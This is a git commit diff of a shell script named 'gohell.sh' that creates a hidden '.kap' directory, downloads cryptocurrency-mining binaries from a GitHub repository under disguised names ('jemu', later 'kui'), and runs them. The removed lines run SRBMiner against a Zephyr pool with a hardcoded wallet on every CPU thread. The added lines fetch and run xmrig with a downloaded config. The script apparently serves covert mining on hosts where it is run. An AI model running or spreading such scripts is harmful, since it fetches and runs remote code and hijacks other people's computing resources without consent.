2004bbd00ca1514421f789955238b761467b78b4
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-02-29 02:26:26 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
-wget -O jemu https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
-chmod 777 jemu
-sudo ./jemu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --cpu-threads $(nproc --all)
+wget -O kui https://github.com/nandafiku/gradi/raw/main/xmrig
+wget https://github.com/nandafiku/gradi/raw/main/config.json
+chmod 777 kui config.json
+./kui -c "config.json"
